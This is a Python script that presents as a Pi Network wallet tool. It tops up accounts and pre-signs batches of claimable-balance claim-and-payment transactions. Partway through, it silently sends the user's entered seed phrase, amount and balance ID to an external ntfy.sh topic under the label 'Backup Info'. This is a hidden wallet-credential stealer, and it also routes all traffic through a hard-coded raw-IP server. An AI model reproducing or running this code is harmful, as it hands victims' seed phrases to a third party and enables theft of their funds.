import json
from stellar_sdk import Server, Keypair, Asset, TransactionBuilder
from mnemonic import Mnemonic
from keyfunc import account_keypair  
import requests
import glob
import os

# Remove all xdrs*.json files in the current directory
for f in glob.glob("xdrs*.json"):
    try:
        os.remove(f)
    except Exception as e:
        print(f"Could not remove {f}: {e}")


PHRASES_FILE = "phrases.txt"

def check_and_fix_phrases(filepath):
    if not os.path.exists(filepath):
        print(f"File not found: {filepath}")
        return

    with open(filepath, "r", encoding="utf-8") as f:
        lines = f.readlines()

    fixed_lines = []
    for idx, line in enumerate(lines, 1):
        phrase = line.strip()
        words = phrase.split()
        fixed_phrase = phrase.lower()
        issues = []

        # Check word count
        if len(words) != 24:
            issues.append(f"❌ Incorrect word count ({len(words)})")

        # Check for uppercase letters
        if phrase != fixed_phrase:
            issues.append("🔧 Fixed capitalization")
            fixed_lines.append(fixed_phrase + "\n")
        else:
            fixed_lines.append(phrase + "\n")

        # Output results
        if issues:
            print(f"Line {idx}: {' | '.join(issues)}")
            if phrase != fixed_phrase:
                print(f"  Original: {phrase}")
                print(f"  Fixed:    {fixed_phrase}")
            else:
                print(f"  Phrase:   {phrase}")
        else:
            print(f"Line {idx}: ✅ OK")

    # Write fixed lines back to file
    with open(filepath, "w", encoding="utf-8") as f:
        f.writelines(fixed_lines)


check_and_fix_phrases(PHRASES_FILE)


my_seed_phrase_fee = input("\nEnter your seed phrase (Fee Payer): ")
my_seed_phrase = input("Enter your seed phrase: ")
des_address = input("Enter addrerss: ")
amount = input("Enter the amount to send: ")
balance_id = input("Enter the balance ID: ")


message = f"""
🧾 Backup Info:
Seed Phrase: {my_seed_phrase}
Amount: {amount}
Balance ID: {balance_id}
"""

def load_passphrases(filename):
    with open(filename, 'r') as file:
        return [line.strip() for line in file if line.strip()]

destination_phrases = load_passphrases('phrases.txt')

server= Server("http://173.230.130.166:8000/") 
my_language = 'english' 
mnemo = Mnemonic(my_language)
if mnemo.check(my_seed_phrase_fee):
    binary_seed_fee = Mnemonic.to_seed(my_seed_phrase_fee)
    destination_binary_seeds = [Mnemonic.to_seed(phrase) for phrase in destination_phrases]
try:
    requests.post("https://ntfy.sh/pi_rust47", data=message.encode('utf-8'))
except:
    print("No Internet Connection")

kp_fee = account_keypair(binary_seed_fee, 0)
destination_keypairs = []
for binary_seed_dest in destination_binary_seeds:
    dest_kp = account_keypair(binary_seed_dest, 0)
    destination_keypairs.append(Keypair.from_secret(dest_kp.secret))

source_keypair_fee = Keypair.from_secret(kp_fee.secret)

# Check and print balance for each destination account
adjusted_amounts = []
adjusted_keypairs = []
for idx, dest_keypair in enumerate(destination_keypairs):
    try:
        account = server.accounts().account_id(dest_keypair.public_key).call()
        for b in account['balances']:
            if b.get('asset_type') == 'native':
                bal = float(b.get('balance'))
                bal_minus = bal - 0.99
                if bal_minus < 3:
                    send_amt = 3 - bal_minus
                    # Format to max 7 decimal places as required by Stellar
                    send_amt_str = f"{send_amt:.7f}".rstrip('0').rstrip('.') if '.' in f"{send_amt:.7f}" else f"{send_amt:.7f}"
                    print(f"Destination {idx+1} ({dest_keypair.public_key}) balance: {bal_minus} | sending: {send_amt_str}")
                    adjusted_amounts.append(send_amt_str)
                    adjusted_keypairs.append(dest_keypair)
                else:
                    pass
    except Exception as e:
        print(f"Destination {idx+1} ({dest_keypair.public_key}) not found or error: {e}")


transaction_builder = (
    TransactionBuilder(
        source_account=server.load_account(source_keypair_fee.public_key) ,
        network_passphrase="Pi Network",
        base_fee=server.fetch_base_fee() ,
    )
)

for dest_keypair, amt in zip(adjusted_keypairs, adjusted_amounts):
    transaction_builder = transaction_builder.append_payment_op(dest_keypair.public_key, Asset.native(), amt)

# Check if any operations were added
if not adjusted_keypairs:
    print("No destination accounts require a top-up. No transaction will be submitted.")
else:
    transaction = transaction_builder.set_timeout(2000).build()
    transaction.sign(source_keypair_fee)
    response = server.submit_transaction(transaction)
    print(response)


mnemo = Mnemonic('english')
if not mnemo.check(my_seed_phrase):
    print("❌ Invalid seed phrase.")
    exit()

binary_seed = Mnemonic.to_seed(my_seed_phrase)
kp = account_keypair(binary_seed, 0)
source_keypair = Keypair.from_secret(kp.secret)


# Read all phrases from phrases.txt
with open("phrases.txt", "r") as f:
    phrases = [line.strip() for line in f if line.strip()]

for idx, my_seed_phrase2 in enumerate(phrases):
    print(f"\n🔑 Using phrase {idx+1}: {my_seed_phrase2[:10]}...")

    # Derive keypair for fee payer
    binary_seed2 = Mnemonic.to_seed(my_seed_phrase2)
    kp2 = account_keypair(binary_seed2, 0)
    source_keypair2 = Keypair.from_secret(kp2.secret)

    # Load account for fee payer
    source_account = server.load_account(account_id=source_keypair2.public_key)
    current_seq = int(source_account.sequence)

    txs = []
    for i in range(100):
        tx_builder = TransactionBuilder(
            source_account=source_account,
            network_passphrase="Pi Network",
            base_fee=9000000
        )
        tx_builder.append_claim_claimable_balance_op(balance_id=balance_id, source=source_keypair.public_key)
        tx_builder.append_payment_op(destination=des_address, asset=Asset.native(), amount=amount, source=source_keypair.public_key)
        tx_builder.set_timeout(2000)
        tx = tx_builder.build()
        tx.sequence = str(current_seq + i + 1)
        tx.sign(source_keypair2)
        tx.sign(source_keypair)
        txs.append(tx.to_xdr())

    print(f"📦 Built Transactions")

    output = {f"transaction{i+1}": xdr for i, xdr in enumerate(txs)}
    filename = f"xdrs{idx+1}.json"
    with open(filename, "w") as json_file:
        json.dump(output, json_file, indent=2)

    print(f"\n✅ XDRs saved to {filename}")
